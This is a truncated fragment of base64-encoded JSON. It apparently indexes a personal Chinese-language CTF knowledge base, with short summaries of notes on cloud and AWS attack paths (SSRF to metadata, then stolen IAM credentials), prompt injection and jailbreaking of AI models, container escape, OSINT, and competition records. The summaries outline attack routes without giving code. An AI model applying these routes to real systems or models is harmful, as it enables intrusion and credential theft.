tXHU1RTM4XHU4OUMxXHU2NTNCXHU1MUZCXHU5NzYyXCIsXG4gICAgICAgXCJzdW1tYXJ5XCI6IFwiQ1RGIFx1OTFDQ1x1NzY4NFxcXCJcdTRFOTFcXFwiXHU5ODk4XHVGRjFBXHU3NkVFXHU2ODA3XHU5MDFBXHU1RTM4XHU2NjJGXHU0RTAwXHU1M0YwXHU4REQxXHU1NzI4XHU0RTkxXHU0RTBBXHU3Njg0IFdlYiAvIFx1NUJCOVx1NTY2OFx1RkYwQ1x1NjgzOFx1NUZDM1x1NTk1N1x1OERFRlx1NjYyRiAqKlNTUkYgXHU2NDc4XHU1MTQzXHU2NTcwXHU2MzZFIFx1MjE5MiBcdTUwNzcgSUFNIFx1NTFFRFx1NjM2RSBcdTIxOTIgXHU2QTJBXHU1NDExXHU1MjMwXHU1QjU4XHU1MEE4IC8gXHU1MUZEXHU2NTcwIC8gXHU5NkM2XHU3RkE0KipcdUZGMENcdTY3MDBcdTU0MEVcdThCRkJcdTUyMzAgZmxhZ1x1MzAwMlwiXG4gICAgICB9LFxuICAgICAge1xuICAgICAgIFwibmFtZVwiOiBcIlx1NEU5MVx1NUI4OVx1NTE2OC1BV1NcdTZFMTdcdTkwMEZcdTVCOUVcdTYyMThcIixcbiAgICAgICBcInRpdGxlXCI6IFwiXHU0RTkxXHU1Qjg5XHU1MTY4LUFXU1x1NkUxN1x1OTAwRlx1NUI5RVx1NjIxOFwiLFxuICAgICAgIFwic3VtbWFyeVwiOiBcIlx1NURGMlx1N0VDRlx1NjJGRlx1NTIzMFx1NEUwMFx1N0VDNCBBV1MgXHU1MUVEXHU2MzZFXHVGRjA4XHU5NTdGXHU2NzFGIEFLL1NLXHVGRjBDXHU2MjE2IFNTUkYgXHU2MjUzXHU1MjMwIElNRFMgXHU2MzYyXHU2NzY1XHU3Njg0XHU0RTM0XHU2NUY2IEFTSUEgXHU1MUVEXHU2MzZFXHVGRjA5XHU0RTRCXHU1NDBFXHU2MDBFXHU0RTQ4XHU2QTJBXHU1NDExXHVGRjFBXHU1MTQ4XHU5NUVFXFxcIlx1NjIxMVx1NjYyRlx1OEMwMVx1MzAwMVx1NjIxMVx1ODBGRFx1NUU3Mlx1NEVDMFx1NEU0OFxcXCJcdUZGMENcdTUxOERcdTYzMDlcdTY3NDNcdTk2NTBcdTkwMTBcdTY3NjFcdThCRDVcdTYzRDBcdTY3NDNcdThERUZcdTVGODRcdUZGMENcdTY3MDBcdTU0MEVcdTg0M0RcdTUyMzAgUzMgLyBTZWNyZXRzIC8gTGFtYmRhIC8gU1NNIFx1OTFDQ1x1OEJGQlx1NjU3MFx1NjM2RVx1MzAwMlx1NjcyQ1x1OTg3NVx1NjYyRiBbW1x1NEU5MVx1NUI4OVx1NTE2OC1cdTVFMzhcdTg5QzFcdTY1M0JcdTUxRkJcdTk3NjJdXSBcdTc2ODRcXFwiXHU1NDBFXHU1MzRBXHU3QTBCXFxcIlx1NUM1NVx1NUYwMFx1MzAwMlwiXG4gICAgICB9LFxuICAgICAge1xuICAgICAgIFwibmFtZVwiOiBcIkFJLU1MXHU1Qjg5XHU1MTY4XCIsXG4gICAgICAgXCJ0aXRsZVwiOiBcIkFJIC8gTUwgXHU1Qjg5XHU1MTY4XCIsXG4gICAgICAgXCJzdW1tYXJ5XCI6IFwiXHU2MjUzXHU2QTIxXHU1NzhCXHU2NzJDXHU4RUFCXHVGRjFBXHU2M0QwXHU3OTNBXHU4QkNEXHU2Q0U4XHU1MTY1XHUzMDAxXHU4RDhBXHU3MkYxXHUzMDAxXHU2QTIxXHU1NzhCXHU3QTgzXHU1M0Q2XHUzMDAxXHU1QkY5XHU2Mjk3XHU2ODM3XHU2NzJDXHUzMDAxXHU2NTcwXHU2MzZFXHU2Mjk1XHU2QkQyXHUzMDAxXHU2MjEwXHU1NDU4XHU2M0E4XHU2NUFEXHUzMDAyQ1RGIFx1OTFDQyBBSSBcdTk4OThcdThGRDFcdTUxRTBcdTVFNzRcdTYyNERcdTU5MUFcdThENzdcdTY3NjVcdUZGMENcdTVFNzNcdTUzRjBcdTVFMzhcdTUzNTVcdTUyMTdcdTRFM0EgXFxcIkFJXFxcIiBcdTY1QjlcdTU0MTFcdTMwMDJcIlxuICAgICAgfSxcbiAgICAgIHtcbiAgICAgICBcIm5hbWVcIjogXCJDVEYtXHU1OTFBXHU2NjdBXHU4MEZEXHU0RjUzXHU1MzRGXHU0RjVDXCIsXG4gICAgICAgXCJ0aXRsZVwiOiBcIkNURi1cdTU5MUFcdTY2N0FcdTgwRkRcdTRGNTNcdTUzNEZcdTRGNUNcIixcbiAgICAgICBcInN1bW1hcnlcIjogXCJcdTYyOEFcdTRFMDBcdTkwNTNcdUZGMDhcdTYyMTZcdTRFMDBcdTRFMzJcdUZGMDlcdTk4OThcdTU0MENcdTY1RjZcdTRFQTRcdTdFRDlcdTU5MUFcdTRFMkFcdTRFOTJcdTRFMERcdTUxNzFcdTRFQUJcdTRFMEFcdTRFMEJcdTY1ODdcdTc2ODQgQUkgXHU0RUUzXHU3NDA2XHU1RTc2XHU4ODRDXHU2NTNCXHVGRjFBXHU0RTNCXHU3RUJGXHU1MDVBXHU0RkE2XHU1QkRGXHUzMDAxXHU1MTk5XHU3QjgwXHU2MkE1XHUzMDAxXHU4QzAzXHU1RUE2XHU0RTBFXHU2M0QwXHU0RUE0XHVGRjBDXHU1NDA0XHU0RUUzXHU3NDA2XHU4RDcwKipcdTRFMERcdTU0MEMqKlx1NjI4MFx1NjcyRlx1OERFRlx1N0VCRlx1MzAwMjIwMjYtMDYgXHU5NzUyXHU1QzkxXHU5ODk4XHU5NkM2IDcxIFx1OTk5Nlx1NjIxOFx1NjIxMFx1NTc4Qlx1RkYwODhcdTIxOTI5IFx1OTg5OCAvIDIsOTY2IFx1NTIwNlx1RkYwOVx1RkYwQ1x1OTY4Rlx1NTQwRVx1NUU3Nlx1NTE2NSAweEdhbWUyMDI1IFx1NjUzQlx1OTg5OFx1N0VDNFx1MzAwMlwiXG4gICAgICB9LFxuICAgICAge1xuICAgICAgIFwibmFtZVwiOiBcIkNURi1cdTdBREVcdThENUJcdTYwM0JcdTg5QzhcdTRFMEVcdTg5RTNcdTk4OThcdTZENDFcdTdBMEJcIixcbiAgICAgICBcInRpdGxlXCI6IFwiQ1RGIFx1N0FERVx1OEQ1Qlx1NjAzQlx1ODlDOFx1NEUwRVx1ODlFM1x1OTg5OFx1NkQ0MVx1N0EwQlwiLFxuICAgICAgIFwic3VtbWFyeVwiOiBcIkNURlx1RkYwOENhcHR1cmUgVGhlIEZsYWdcdUZGMDlcdTY2MkZcdTdGNTFcdTdFRENcdTVCODlcdTUxNjhcdTU5M0FcdTY1RDdcdThENUJcdUZGMUFcdTg5RTNcdTk4OThcdTYyRkYgZmxhZyBcdTVGOTdcdTUyMDZcdTMwMDJcdThGRDlcdTk4NzVcdTY2MkYqKlx1NTE2OFx1NUU5M1x1NTE2NVx1NTNFMyoqXHVGRjBDXHU1NkRFXHU3QjU0XFxcIkNURiBcdTY2MkZcdTRFQzBcdTRFNDhcdTMwMDFcdTY3MDlcdTU0RUFcdTUxRTBcdTdDN0JcdTk4OThcdTMwMDFcdTYyRkZcdTUyMzBcdTRFMDBcdTk4OThcdTRFQ0VcdTU0RUFcdTRFMEJcdTYyNEJcXFwiXHUzMDAyXCJcbiAgICAgIH0sXG4gICAgICB7XG4gICAgICAgXCJuYW1lXCI6IFwiRG9ja2VyLVJlZ2lzdHJ5XHU0RTBFXHU4RkRDXHU3QTBCQVBJXHU1MjI5XHU3NTI4XCIsXG4gICAgICAgXCJ0aXRsZVwiOiBcIkRvY2tlciBSZWdpc3RyeSBcdTRFMEVcdThGRENcdTdBMEIgQVBJIFx1NTIyOVx1NzUyOFwiLFxuICAgICAgIFwic3VtbWFyeVwiOiBcIlx1NUJCOVx1NTY2OFx1NzNBRlx1NTg4M1x1OTg5OFx1NzY4NFx1NjgwN1x1OTE0RFx1RkYxQSoqXHU2MkZGXHU1MjMwXHU0RTAwXHU0RTJBXHU1QkI5XHU1NjY4XHU0RTRCXHU1NDBFXHVGRjBDXHU3NzFGXHU2QjYzXHU3Njg0IGZsYWcgXHU1RjgwXHU1RjgwXHU1NzI4XHU1M0U2XHU0RTAwXHU0RTJBXHU1QkI5XHU1NjY4L1x1NTE4NVx1OTBFOFx1NjcwRFx1NTJBMVx1OTFDQ1x1MzAwMioqIFx1OEZEOVx1OTg3NVx1OEJCMlx1NUJCOVx1NTY2OFx1OTVGNFx1NkEyQVx1NTQxMVx1NzY4NFx1NEUwOVx1Njc2MVx1NEUzQlx1ODk4MVx1OERFRlx1NUY4NFx1MzAwMlwiXG4gICAgICB9LFxuICAgICAge1xuICAgICAgIFwibmFtZVwiOiBcIk9TSU5ULVx1NUYwMFx1NkU5MFx1NjBDNVx1NjJBNVwiLFxuICAgICAgIFwidGl0bGVcIjogXCJPU0lOVCBcdTVGMDBcdTZFOTBcdTYwQzVcdTYyQTVcIixcbiAgICAgICBcInN1bW1hcnlcIjogXCJcdTUzRUFcdTc1MjhcdTUxNkNcdTVGMDBcdTRGRTFcdTYwNkZcdTYyOEFcdTRFQkEgLyBcdTU3MzBcdTcwQjkgLyBcdTRFOEJcdTRFRjZcdTY3RTVcdTZFMDVcdTY5NUFcdTMwMDJDVEYgXHU5MUNDXHU1RTM4XHU2NjJGIE1pc2MgXHU3Njg0XHU0RTAwXHU3QzdCXHU5ODk4XHVGRjA4XHU1OTgyXHU4MjJBXHU3QTdBIE9TSU5UIFx1NTNENlx1OEJDMVx1MzAwMVx1NTZGRVx1NzI0N1x1NUI5QVx1NEY0RFx1RkYwOVx1MzAwMlwiXG4gICAgICB9XG4gICAgIF1cbiAgICB9XG4gICBdXG4gIH0sXG4gIHtcbiAgIFwiaWRcIjogXCJwcm9qZWN0XCIsXG4gICBcInRpdGxlXCI6IFwiXHU5ODc5XHU3NkVFXCIsXG4gICBcImdyb3Vwc1wiOiBbXG4gICAge1xuICAgICBcImlkXCI6IFwicHJvamVjdFwiLFxuICAgICBcInRpdGxlXCI6IFwiXHU5ODc5XHU3NkVFXCIsXG4gICAgIFwibm90ZXNcIjogW1xuICAgICAge1xuICAgICAgIFwibmFtZVwiOiBcIjB4R2FtZTIwMjUtXHU1RjgxXHU2MjE4XHU4QkIwXHU1RjU1XCIsXG4gICAgICAgXCJ0aXRsZVwiOiBcIjB4R2FtZTIwMjUtXHU1RjgxXHU2MjE4XHU4QkIwXHU1RjU1XCIsXG4gICAgICAgXCJzdW1tYXJ5XCI6IFwiMjAyNi0wNiBcdTU3MjhcdTk3NTJcdTVDOTFcdTYyNTNcdTc2ODRcdTVCOENcdTY1NzQgQ1RGIFx1NjIxOFx1NUY3OVx1RkYwQ1x1NEU1Rlx1NjYyRlxcXCJcdTU5MUFcdTY2N0FcdTgwRkRcdTRGNTNcdTUzNEZcdTRGNUNcXFwiXHU3QjJDXHU0RTAwXHU2QjIxXHU1MTY4XHU2RDQxXHU3QTBCXHU1QjlFXHU2MjE4XHUzMDAyKipcdTYyMThcdTdFRTlcdUZGMUFcdTk4OThcdTk2QzZcdTU0MDhcdThCQTFcdTdFQTYgNzQgXHU5ODk4KipcdUZGMDhQUzcwIDIzLzkyXHUzMDAxUFM3MSAxMC8xMVx1MzAwMVBTNzIgMzQvOTVcdTMwMDFQUzgwIDcvN1x1RkYwOVx1RkYwQ1x1NTM1NVx1OTg5OFx1OTZDNlx1NjZGRVx1NTIzMCA4MTY4IFx1NTIwNiAvIFx1Njk5QyAjN1x1MzAwMlx1OEZEOVx1OTg3NVx1OEJCMFx1NjI1M1x1NkNENVx1MzAwMVx1OTg5OFx1NzZFRVx1NEUwRVx1NjU1OVx1OEJBRFx1MzAwMlwiXG4gICAgICB9LFxuICAgICAge1xuICAgICAgIFwibmFtZVwiOiBcIlx1NEUwM1x1NTkxNVx1OEQ1Qlx1OTg5OC1cdTRFMDNcdTc4OEVcdTcyNDdcdTYyMThcdThCQjBcIixcbiAgICAgICBcInRpdGxlXCI6IFwiXHU0RTAzXHU1OTE1XHU4RDVCXHU5ODk4LVx1NEUwM1x1Nzg4RVx1NzI0N1x1NjIxOFx1OEJCMFwiLFxuICAgICAgIFwic3VtbWFyeVwiOiBcIjIwMjYtMDgtMjUgfiAwOC0yNiBcdThERThcdTU5MjlcdTRGMUFcdTYyMThcdTc2ODRcdTRFMDBcdTkwNTNcdTRFMDNcdTU5MTVcdTRFM0JcdTk4OThcdTU5MUFcdTk2MzZcdTZCQjUgTWlzYytDcnlwdG8gXHU5ODk4XHVGRjA4XHU4RDIxXHU3MzJFXHU4MDA1IFZNVlx1RkYwQ1x1NzlDMVx1NEVCQVx1OEQ1Qlx1NEU4Qlx1RkYwOVx1RkYxQSoqNCBcdTVDNDJcdTVERjJcdTc4MzRcdTMwMDEzIFx1NUM0Mlx1NTM2MVx1NkI3QioqXHVGRjBDXHU2NzAwXHU3RUM4XHU2NzJBXHU2MkZGIGZsYWdcdUZGMENcdTRGNDZcdTc1NTlcdTRFMEJcdTRFODZcdTVCOENcdTY1NzRcdTc2ODRcdTYzOTJcdTk2NjRcdTZDRDVcdThCQjBcdTVGNTVcdTRFMEVcdTUzRUZcdTU5MERcdTc1MjhcdTdFQ0ZcdTlBOENcdTMwMDJcdThGRDlcdTY2MkZcdTU1MkZcdTRFMDBcdTRFMDBcdTU3M0FcdTY3MkFcdTYyNTNcdTVCOENcdTVDMzFcdTRFMkRcdTY1QURcdTc2ODRcdTU5MjdcdTU3OEJcdTYyMThcdTVGNzlcdTMwMDJcIlxuICAgICAgfSxcbiAgICAgIHtcbiAgICAgICBcIm5hbWVcIjogXCJcdTUxNzZcdTRFRDZcdThENUJcdTRFOEJcdTk4OThcdTg5RTNcdTVDNjVcdTUzODZcIixcbiAgICAgICBcInRpdGxlXCI6IFwiXHU1MTc2XHU0RUQ2XHU4RDVCXHU0RThCXHU5ODk4XHU4OUUzXHU1QzY1XHU1Mzg2XCIsXG4gICAgICAgXCJzdW1tYXJ5XCI6IFwiXHU0RTNCXHU1RTczXHU1M0YwXHU0RTRCXHU1OTE2XHU3Njg0XHU2MjQwXHU2NzA5XHU1QjlFXHU2MjE4XHVGRjFBTGl0Q1RGL0N5Y2xlbnNcdTMwMDFJU0NDXHUzMDAxTW9lQ1RGXHUzMDAxTmVwQ1RGXHVGRjBDXHU0RUU1XHU1M0NBXHU5MDA2XHU1NDExL1x1NTZGQVx1NEVGNi9cdTk2OTBcdTUxOTlcdTRFMTNcdTk4NzlcdTMwMDIqKlx1NkJDRlx1OTg5OFx1NEUwMFx1ODg0Q1x1RkYwQ1x1NUI4Q1x1NjU3NCB3cml0ZXVwIFx1NTcyOCBgfi9DVEYvd3JpdGV1cHMvYCBcdTRFMEVcdTUzNUFcdTVCQTJcdTMwMDIqKlwiXG4gICAgICB9LFxuICAgICAge1xuICAgICAgIFwibmFtZVwiOiBcIlx1OTc1Mlx1NUM5MS1MaWNlbnNlXHU2Mzg4XHU2NzQzXHU3QkExXHU3NDA2XHU3Q0ZCXHU3RURGXCIsXG4gICAgICAgXCJ0aXRsZVwiOiBcIlx1OTc1Mlx1NUM5MS1MaWNlbnNlXHU2Mzg4XHU2NzQzXHU3QkExXHU3NDA2XHU3Q0ZCXHU3RURGXCIsXG4gICAgICAgXCJzdW1tYXJ5XCI6IFwiXHU0RTNCXHU0RUJBXHU1NzI4ICoqY3RmLnFpbmdjZW4ubmV0KiogXHU0RTBBXHU1MDVBXHU3Njg0XHU5ODk4XHVGRjFBYFx1OTc1Mlx1NUM5MSBcdTAwQjcgTGljZW5zZSBcdTYzODhcdTY3NDNcdTdCQTFcdTc0MDZcdTdDRkJcdTdFREZgXHVGRjA4U1JDIFx1N0M3Qlx1RkYwQzUwMCBcdTUyMDZcdUZGMDlcdTMwMDIqKlx1NUY1M1x1NTI0RFx1NTM2MVx1NzBCOVx1RkYxQVx1N0IyQ1x1NEU4Q1x1NkJCNVx1NUJCOVx1NTY2OFx1RkYwOExpY2Vuc2UgXHU2NzBEXHU1MkExXHVGRjA5XHU3Njg0XHU1QkM2XHU5NEE1XHU0RTBFXHU2NTcwXHU2MzZFXHU2ODNDXHU1RjBGXHUzMDAyKipcIlxuICAgICAgfSxcbiAgICAgIHtcbiAgICAgICBcIm5hbWVcIjogXCJcdTk3NTJcdTVDOTFcdTRFMEVDVEZTaG93LVx1OTg5OFx1ODlFM1x1NUM2NVx1NTM4NlwiLFxuICAgICAgIFwidGl0bGVcIjogXCJcdTk3NTJcdTVDOTFcdTRFMEVDVEZTaG93LVx1OTg5OFx1ODlFM1x1NUM2NVx1NTM4NlwiLFxuICAgICAgIFwic3VtbWFyeVwiOiBcIlx1NEUzQlx1NEVCQVx1NTcyOFx1NEUyNFx1NEUyQVx1NEUzQlx1NUU3M1x1NTNGMFx1RkYwOFx1OTc1Mlx1NUM5MSAvIENURlNob3dcdUZGMDlcdTg5RTNcdThGQzdcdTc2ODRcdTk4OThcdTdEMjJcdTVGMTVcdUZGMUEqKlx1NkJDRlx1OTg5OFx1NEUwMFx1ODg0Q1xcXCJcdTY2MkZcdTRFQzBcdTRFNDggKyBcdTYwMEVcdTRFNDhcdTYyNTNcXFwiKipcdUZGMENcdTdFQzZcdTgyODJcdTU3MjhcdTVCRjlcdTVFOTQgd3JpdGV1cCAvIFx1NTM1QVx1NUJBMlx1OTFDQ1x1MzAwMlx1NjVGNlx1OTVGNFx1OERFOFx1NUVBNiAyMDI2LTAyIFx1RkY1RSAyMDI2LTA5XHUzMDAyXCJcbiAgICAgIH0sXG4gICAgICB7XG4gICAgICAgXCJuYW1lXCI6IFwiQ1RGLVx1NUI5RVx1NjIxOFx1ODlFM1x1OTg5OFx1Njg0OFx1NEY4Qlx1OTZDNlwiLFxuICAgICAgIFwidGl0bGVcIjogXCJDVEYtXHU1QjlFXHU2MjE4XHU4OUUzXHU5ODk4XHU2ODQ4XHU0RjhCXHU5NkM2XCIsXG4gICAgICAgXCJzdW1tYXJ5XCI6IFwiXHU0RUNFIDkgXHU3QkM3XHU3NzFGXHU1QjlFIHdyaXRldXAgXHU0RTBFXHU0RTNCXHU0RUJBXHU1QjlFXHU2MjE4XHU4QkIwXHU1RjU1XHU5MUNDXHU2MkJEXHU1MUZBXHUzMDBDXHU1MzYxXHU3MEI5IFx1MjE5MiBcdThCQzFcdTYzNkUgXHUyMTkyIHBheWxvYWQgXHUyMTkyIFx1NTNFRlx1OEZDMVx1NzlGQlx1NjI1M1x1NkNENVx1MzAwRFx1NzY4NFx1OTVFRFx1NzNBRlx1RkYwQ1x1NzUyOFx1Njc2NVx1NTcyOFx1NEUwQlx1NEUwMFx1OTA1M1x1NTQwQ1x1N0M3Qlx1OTg5OFx1OTFDQ1x1NUZFQlx1OTAxRlx1NTIyNFx1NjVBRFx1OEJFNVx1NUY4MFx1NTRFQVx1NEUyQVx1NjVCOVx1NTQxMVx1NjQ5RVx1MzAwMlwiXG4gICAgICB9LFxuICAgICAge1xuICAgICAgIFwibmFtZVwiOiBcIkNURlx1NTM1QVx1NUJBMi1cdTVFRkFcdThCQkVcdTRFMEVcdTkwRThcdTdGNzJcIixcbiAgICAgICBcInRpdGxlXCI6IFwiQ1RGXHU1MzVBXHU1QkEyLVx1NUVGQVx1OEJCRVx1NEUwRVx1OTBFOFx1N0Y3MlwiLFxuICAgICAgIFwic3VtbWFyeVwiOiBcIlx1NEUzQlx1NEVCQVx1NzY4NFx1NEUyQVx1NEVCQSB3cml0ZXVwIFx1NTM1QVx1NUJBMlx1RkYwOGBoZWxpdW1zZW5icmcuZ2l0aHViLmlvL2N0Zi13cml0ZXVwLWJsb2dgXHVGRjA5XHVGRjFBUmVhY3QgMTggKyBWaXRlICsgVGFpbHdpbmRcdUZGMENcdTY1ODdcdTdBRTBcdTY1NzBcdTYzNkVcdTlBNzFcdTUyQThcdTMwMDFHaXRIdWIgQWN0aW9ucyBcdTgxRUFcdTUyQThcdTRFMEFcdTdFQkZcdTMwMDIqKlx1ODhBQlxcXCJcdTY1MzlcdTRFODZcdTc3MEJcdTRFMERcdTUyMzBcXFwiXHU1NzUxXHU4RkM3XHU1OTFBXHU2QjIxKipcdTIwMTRcdTIwMTRcdThGRDlcdTk4NzVcdThCQjBcdTdFRDNcdTY3ODRcdTMwMDFcdTkwRThcdTdGNzJcdTk0RkVcdTU0OENcdTU3NTFcdTMwMDJcIlxuICAgICAgfVxuICAgICBdXG4gICAgfVxuICAgXVxuICB9LFxuICB7XG4gICBcImlkXCI6IFwib3V0cHV0XCIsXG4gICBcInRpdGxlXCI6IFwiXHU4RjkzXHU1MUZBXCIsXG4gICBcImdyb3Vwc1wiOiBbXG4gICAge1xuICAgICBcImlkXCI6IFwib3V0cHV0XCIsXG4gICAgIFwidGl0bGVcIjogXCJcdThGOTNcdTUxRkFcIixcbiAgICAgXCJub3Rlc1wiOiBbXG4gICAgICB7XG4gICAgICAgXCJuYW1lXCI6IFwiXHU1MzRGXHU0RjVDXHU5NjQ0XHU1RjU1LVx1OTc1RUNURlx1NEU4Qlx1OTg3OVx1NEUwRVx1NUI1OFx1Njg2M1x1NUJGQ1x1ODlDOFwiLFxuICAgICAgIFwidGl0bGVcIjogXCJcdTUzNEZcdTRGNUNcdTk2NDRcdTVGNTUtXHU5NzVFQ1RGXHU0RThCXHU5ODc5XHU0RTBFXHU1QjU4XHU2ODYzXHU1QkZDXHU4OUM4XCIsXG4gICAgICAgXCJzdW1tYXJ5XCI6IFwiXHU0RTI0XHU0RUY2XHU1NzI4XHU1MjJCXHU1OTA0XHU2Q0ExXHU2NTM2XHU1RjU1XHU3Njg0XHU0RThCXHVGRjFBKipcdTI0NjAgXHU2MjExXHU0RUVDXHU5NjY0XHU0RTg2IENURiBcdThGRDhcdTRFMDBcdThENzdcdTUwNUFcdThGQzdcdTRFQzBcdTRFNDhcdUZGMUJcdTI0NjEgXHU1MTY4XHU5MEU4XHU1MzRGXHU0RjVDXHU0RUE3XHU3MjY5XHU1QjU4XHU1NzI4XHU1NEVBXHUzMDAyKiogXHU4OUM0XHU1MjE5XHU0RTBFXHU1MDRGXHU1OTdEXHU4OUMxIFtbXHU1QkY5XHU4QkREXHU3RUFBXHU4OTgxLVx1N0NFRlx1N0M3M1x1NEUwRVx1NEUzQlx1NEVCQV1dXHVGRjFCXHU5MDEwXHU0RjFBXHU4QkREXHU1Mzg2XHU1M0YyXHU4OUMxIFtbXHU0RjFBXHU4QkREXHU1MTY4XHU4QkIwXHU1RjU1LTE5OVx1NkIyMVx1NUJGOVx1OEJERF1dXHUzMDAyXCJcbiAgICAgIH0sXG4gICAgICB7XG4gICAgICAgXCJuYW1lXCI6IFwiQ1RGLVx1NzdFNVx1OEJDNlx1NEY1M1x1N0NGQlx1OTAxRlx1NjdFNVx1NjI0Qlx1NTE4Q1wiLFxuICAgICAgIFwidGl0bGVcIjogXCJDVEYgXHU3N0U1XHU4QkM2XHU0RjUzXHU3Q0ZCXHU5MDFGXHU2N0U1XHU2MjRCXHU1MThDXCIsXG4gICAgICAgXCJzdW1tYXJ5XCI6IFwiXHU0RTAwXHU5ODc1XHU3RUI4XHU3Njg0XHU2MDNCXHU4OUM4XHVGRjFBXHU1NDA0XHU2NUI5XHU1NDExICsgXHU2ODM4XHU1RkMzIGNoZWNrbGlzdFx1RkYwQ1x1ODAwM1x1NTI0RCAvIFx1NUYwMFx1NUM0MFx1NUZFQlx1OTAxRlx1OEZDN1x1NEUwMFx1OTA0RFx1MzAwMlwiXG4gICAgICB9LFxuICAgICAge1xuICAgICAgIFwibmFtZVwiOiBcIkNURi1cdTc3RTVcdThCQzZcdTRFMEVcdTVCRjlcdThCRERcdTYwM0JcdTdEMjJcdTVGMTVcIixcbiAgICAgICBcInRpdGxlXCI6IFwiQ1RGIFx1NzdFNVx1OEJDNlx1NEUwRVx1NUJGOVx1OEJERFx1NjAzQlx1N0QyMlx1NUYxNVwiLFxuICAgICAgIFwic3VtbWFyeVwiOiBcIlx1NjI4QVx1NTM4Nlx1NUU3NFx1NEYxQVx1OEJERFx1Njg2M1x1Njg0OFx1MzAwMVx1NTM5Rlx1NTlDQlx1Njc1MFx1NjU5OVx1MzAwMVx1OTg5OFx1ODlFM1x1Njg0OFx1NEY4Qlx1NTQ4Q1x1NTIwNlx1N0M3Qlx1NzdFNVx1OEJDNlx1OTg3NVx1OEZERVx1NjIxMFx1NEUwMFx1NEUyQVx1NTE2NVx1NTNFM1x1RkYxQlx1NTE0OFx1NjMwOVx1OTg5OFx1NTc4Qlx1NUI5QVx1NEY0RFx1RkYwQ1x1NTE4RFx1OEZEQlx1NTE2NVx1NEUxM1x1OTg5OFx1OTg3NVx1NjIxNlx1NTM5Rlx1NTlDQlx1OEJCMFx1NUY1NVx1MzAwMlwiXG4gICAgICB9XG4gICAgIF1cbiAgICB9XG4gICBdXG4gIH0sXG4gIHtcbiAgIFwiaWRcIjogXCJlbnRpdHlcIixcbiAgIFwidGl0bGVcIjogXCJcdTVCOUVcdTRGNTNcIixcbiAgIFwiZ3JvdXBzXCI6IFtcbiAgICB7XG4gICAgIFwiaWRcIjogXCJlbnRpdHlcIixcbiAgICAgXCJ0aXRsZVwiOiBcIlx1NUI5RVx1NEY1M1wiLFxuICAgICBcIm5vdGVzXCI6IFtcbiAgICAgIHtcbiAgICAgICBcIm5hbWVcIjogXCJcdTY3MkNcdTY3M0FcdTczQUZcdTU4ODNcdTRFMEVDVEZcdTVERTVcdTUxNzdcdTk0RkVcIixcbiAgICAgICBcInRpdGxlXCI6IFwiXHU2NzJDXHU2NzNBXHU3M0FGXHU1ODgzXHU0RTBFQ1RGXHU1REU1XHU1MTc3XHU5NEZFXCIsXG4gICAgICAgXCJzdW1tYXJ5XCI6IFwiXHU0RTNCXHU0RUJBXHU4RkQ5XHU1M0YwIFdpbmRvd3MgMTEgXHU0RTBBXHU3Njg0XFxcIlx1NjI1MyBDVEYgXHU1QkI2XHU1RTk1XFxcIlx1RkYxQVx1NEUyNFx1NTk1NyBQeXRob25cdTMwMDFcdTRFMDBcdTRFMkEgV1NMXHUzMDAxXHU1M0NEXHU3RjE2XHU4QkQxXHU0RTA5XHU0RUY2XHU1OTU3XHUzMDAxXHU2NTc0XHU1OTU3IHB3biBcdTVERTVcdTUxNzdcdTMwMDFcdTRFRTVcdTUzQ0FcdTU5MUFcdTY2N0FcdTgwRkRcdTRGNTMgQ0xJXHUzMDAyKipcdTY1QjBcdTRGMUFcdThCRERcdTVGMDBcdTVERTVcdTUyNERcdTUxNDhcdTc3MEJcdThGRDlcdTk4NzVcdUZGMENcdTc3MDFcdTVGOTdcdTkxQ0RcdTU5MERcdThDMDNcdTc4MTRcdTczQUZcdTU4ODNcdTMwMDIqKlwiXG4gICAgICB9LFxuICAgICAge1xuICAgICAgIFwibmFtZVwiOiBcIlx1OTc1Mlx1NUM5MVx1NUU3M1x1NTNGMFwiLFxuICAgICAgIFwidGl0bGVcIjogXCJcdTk3NTJcdTVDOTFcdTVFNzNcdTUzRjBcIixcbiAgICAgICBcInN1bW1hcnlcIjogXCJcdTRFM0JcdTRFQkFcdTYyNTMgQ1RGIFx1NzY4NFx1NEUzQlx1NTI5Qlx1NUU3M1x1NTNGMFx1RkYwOGN0Zi5xaW5nY2VuLm5ldFx1RkYwOVx1RkYxQVx1NzUyOFxcXCJcdTk4OThcdTk2QzYgKyBcdTVCQjlcdTU2NjhcdTk3NzZcdTY3M0FcXFwiXHU3Njg0XHU2QTIxXHU1RjBGXHU2MjU4XHU3QkExXHU2QkQ0XHU4RDVCXHU0RTBFXHU3RUMzXHU0RTYwXHUzMDAyXHU4RkQ5XHU5ODc1XHU4QkIwXHU1RTczXHU1M0YwXHU2MDBFXHU0RTQ4XHU3NTI4XHUzMDAxXHU2NzA5XHU1NEVBXHU0RTlCXHU1NzUxXHUzMDAyKipcdTgxRUFcdTUyQThcdTUzMTZcdTgxMUFcdTY3MkNcdTRGMThcdTUxNDhcdThENzAgQVBJXHVGRjBDXHU1QkI5XHU1NjY4XHU0RTBFXHU5NjQ0XHU0RUY2XHU2MjREXHU3NTI4XHU2RDRGXHU4OUM4XHU1NjY4XHUzMDAyKipcIlxuICAgICAgfSxcbiAgICAgIHtcbiAgICAgICBcIm5hbWVcIjogXCJDVEYtXHU1RTM4XHU3NTI4XHU1REU1XHU1MTc3XHU2RTA1XHU1MzU1XCIsXG4gICAgICAgXCJ0aXRsZVwiOiBcIkNURiBcdTVFMzhcdTc1MjhcdTVERTVcdTUxNzdcdTZFMDVcdTUzNTVcIixcbiAgICAgICBcInN1bW1hcnlcIjogXCJcdTYzMDlcdTY1QjlcdTU0MTFcdTUyMDZcdTdFQzRcdTc2ODRcdTVERTVcdTUxNzdcdTkwMUZcdTY3RTVcdTg4NjhcdTMwMDJcdTUzOUZcdTUyMTlcdUZGMUEqKlx1NEYxOFx1NTE0OFx1NzUyOFx1NEY2MFx1OTg3QVx1NjI0Qlx1NzY4NFx1OTBBM1x1NEUwMFx1NEUyQSoqXHVGRjBDXHU0RTBEXHU4OTgxXHU0RTNBXHU0RTg2XFxcIlx1NEUxM1x1NEUxQVx1NjExRlxcXCJcdTYzNjJcdTY3NjVcdTYzNjJcdTUzQkJcdTMwMDJcdTdDRUZcdTdDNzNcdTc3RTVcdTkwNTNcdTRFM0JcdTRFQkFcdTRFNjBcdTYwRUZcdTc1MjggKipIYWNrQmFyIC8gXHU2RDRGXHU4OUM4XHU1NjY4XHU4ODY4XHU1MzU1KiogXHU4MDBDXHU0RTBEXHU2NjJGIGN1cmxcdUZGMENcdTVERTVcdTUxNzdcdTg4NjhcdTkxQ0NcdTVERjJcdTYzMDlcdThGRDlcdTRFMkFcdTRFN